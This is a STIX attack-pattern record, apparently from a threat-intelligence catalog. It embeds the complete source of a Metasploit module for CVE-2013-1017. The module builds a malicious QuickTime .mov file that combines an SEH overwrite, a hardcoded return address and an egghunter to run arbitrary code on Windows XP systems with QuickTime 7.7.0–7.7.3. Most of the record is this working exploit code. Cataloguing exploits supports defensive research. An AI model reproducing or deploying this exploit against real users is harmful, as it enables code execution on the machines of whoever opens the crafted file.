{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--14020c4c-d720-4a75-9599-9d9b39b6cf07",
    "created": "2024-08-14T16:36:04.727884Z",
    "modified": "2024-08-14T16:36:04.727888Z",
    "name": "\"Apple Quicktime 7 Invalid Atom Length Buffer Overflow\"",
    "description": " This module exploits a vulnerability found in Apple QuickTime. The flaw is triggered when QuickTime fails to properly handle the data length for certain atoms such as 'rdrf' or 'dref' in the Alis record, which may result a buffer overflow by loading a specially crafted .mov file, and allows arbitrary code execution under the context of the current user. Please note: Since an egghunter is used to search for the payload, this may require additional time for the exploit to complete.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/apple_quicktime_rdrf.rb",
            "external_id": "apple_quicktime_rdrf.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1017"
        },
        {
            "source_name": "reference",
            "url": "http://support.apple.com/kb/HT5770"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Egghunter\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Apple Quicktime 7 Invalid Atom Length Buffer Overflow\",\n      'Description'    => %q{\n        This module exploits a vulnerability found in Apple QuickTime. The flaw is\n        triggered when QuickTime fails to properly handle the data length for certain\n        atoms such as 'rdrf' or 'dref' in the Alis record, which may result a buffer\n        overflow by loading a specially crafted .mov file, and allows arbitrary\n        code execution under the context of the current user. Please note: Since an egghunter\n        is used to search for the payload, this may require additional time for\n        the exploit to complete.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jason Kratzer', # Original Discovery & PoC (overlapped finding), aka pyoor\n          'Tom Gallagher', # Original Discovery (overlapped)\n          'Paul Bates',    # Original Discovery (overlapped)\n          'sinn3r'         # Metasploit\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-1017' ],\n          [ 'OSVDB', '93625' ],\n          [ 'BID', '60097' ],\n          [ 'URL', 'http://support.apple.com/kb/HT5770' ],\n          [ 'ZDI', '13-110' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Ret = P/P/R in Quicktime.qtx\n          # Tested on:\n          # Quicktime 7.7.0\n          # Quicktime 7.7.1\n          # Quicktime 7.7.2\n          # Quicktime 7.7.3\n          [ 'Quicktime 7.7.0 - 7.7.3 on Windows XP SP3', {'Ret' => 0x66801042 } ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-05-22',\n      'DefaultTarget'\t => 0\n    ))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ true, 'The file name.',  'msf.mov']),\n      ])\n  end\n\n  def sort_bytes(data)\n    buf = ''\n    0.step(data.length, 2) do |i|\n      buf << data[i, 2].reverse\n    end\n\n    buf\n  end\n\n  def exploit\n    fsize = 0\n\n    badchars   = payload_badchars\n    hunter,egg = generate_egghunter(payload.encoded,badchars,{:checksum=>true})\n\n    buf  = ''\n    buf << \"\\x61\" * 5                                  # Make sure our NOPs don't cause AV\n    buf << sort_bytes(make_nops(4))                    # Pad 9 bytes to ensure alignment\n    buf << sort_bytes(hunter)                          # egg huntin'\n    buf << rand_text_alpha(607 - buf.length)           # Offset 607 to nSEH\n    buf << sort_bytes(\"\\xeb\\x06#{rand_text_alpha(2)}\") # nSEH\n    buf << sort_bytes([target.ret].pack(\"V*\"))         # SE Handler\n    buf << sort_bytes(\"\\xe9\\x95\\xfd\\xff\\xff\\xff\")      # Jmp to egghunter\n    buf << rand_text_alpha(50)                         # After SEH, only ~33 bytes\n    buf << egg                                         # Should be found somewhere else\n\n    # Quicktime File Format Specifications:\n    # https://developer.apple.com/standards/qtff-2001.pdf\n    mov  = \"\\x00\\x00\\x06\\xDF\"    # File size\n    mov << \"moov\"                # Movie atom\n    mov << \"\\x00\\x00\\x06\\xD7\"    # size (1751d)\n    mov << \"rmra\"                # Reference Movie atom\n    mov << \"\\x00\\x00\\x06\\xCF\"    # size (1743d)\n    mov << \"rmda\"                # rmda atom\n    mov << \"\\x00\\x00\\x06\\xBF\"    # size (1727d)\n    mov << \"rdrf\"                # Data reference atom\n    mov << \"\\x00\\x00\\x00\\x00\"    # size set to 0\n    mov << \"alis\"                # Data reference type: FS alias record\n    mov << \"\\x00\\x00\\x06\\xAA\"    # Size (1706d)\n    mov << rand_text_alpha(8)\n    mov << \"\\x00\\x00\\x06\\x61\"    # Size (1633d)\n    mov << rand_text_alpha(38)\n    mov << \"\\x12\"\n    mov << rand_text_alpha(81)\n    mov << \"\\xFF\\xFF\"\n    mov << rand_text_alpha(18)\n    mov << \"\\x00\\x08\"            # Size (8d)\n    mov << rand_text_alpha(8)\n    mov << \"\\x00\\x00\"\n    mov << \"\\x00\\x08\"            # Size (8d)\n    mov << rand_text_alpha(8)\n    mov << \"\\x00\\x00\"\n    mov << \"\\x00\\x26\"            # Size (38d)\n    mov << rand_text_alpha(38)\n    mov << \"\\x00\\x0F\\x00\\x0E\"\n    mov << \"AA\"                  # Size (must be invalid)\n    mov << rand_text_alpha(12)\n    mov << \"\\x00\\x12\\x00\\x21\"\n    mov << rand_text_alpha(36)\n    mov << \"\\x00\"\n    mov << \"\\x0F\\x33\"\n    mov << rand_text_alpha(17)\n    mov << \"\\x02\\xF4\"            # Size (756h)\n    mov << rand_text_alpha(756)\n    mov << \"\\xFF\\xFF\\x00\\x00\\x00\"\n    fsize += mov.length\n    mov << buf\n    fsize += buf.length\n\n    mov[0,4] = [fsize].pack(\"N\")\n\n    print_status(\"Creating #{datastore['FILENAME']}\")\n    file_create(mov)\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-05-22",
    "x_mitre_platforms": [
        "win'"
    ]
}